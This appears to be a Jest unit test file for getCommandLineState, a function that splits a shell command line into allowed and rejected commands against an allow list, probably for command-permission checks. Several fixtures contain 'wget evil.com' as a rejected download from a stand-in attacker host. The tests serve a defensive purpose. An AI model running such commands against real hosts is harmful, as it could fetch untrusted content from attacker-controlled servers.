import { getCommandLineState } from '../getCommandLineState.js';

describe('getCommandLineState', () => {
  describe('shape', () => {
    it.each([
      {
        title: 'single allowed command',
        commandLine: 'echo hello',
        allowList: ['echo'],
        expected: {
          isAllowed: true,
          commands: { allowed: ['echo'], rejected: [] },
        },
      },
      {
        title: 'single rejected command',
        commandLine: 'wget evil.com',
        allowList: ['echo'],
        expected: {
          isAllowed: false,
          commands: { allowed: [], rejected: ['wget'] },
        },
      },
      {
        title: 'allowed contains matched pattern not full command',
        commandLine: 'git status --short',
        allowList: ['git status'],
        expected: {
          isAllowed: true,
          commands: { allowed: ['git status'], rejected: [] },
        },
      },
      {
        title: 'mixed pipeline splits into allowed and rejected',
        commandLine: 'git status --short | grep foo && wget evil.com',
        allowList: ['git status', 'grep'],
        expected: {
          isAllowed: false,
          commands: { allowed: ['git status', 'grep'], rejected: ['wget'] },
        },
      },
      {
        title: 'deduplicates allowed when same pattern matches multiple times',
        commandLine: 'echo foo && echo bar',
        allowList: ['echo'],
        expected: {
          isAllowed: true,
          commands: { allowed: ['echo'], rejected: [] },
        },
      },
      {
        title: 'deduplicates rejected when same command denied multiple times',
        commandLine: 'wget foo && wget bar',
        allowList: ['echo'],
        expected: {
          isAllowed: false,
          commands: { allowed: [], rejected: ['wget'] },
        },
      },
    ])('$title', ({ commandLine, allowList, expected }) => {
      const actual = getCommandLineState(commandLine, allowList);
      expect(actual).toEqual(expected);
    });
  });
});
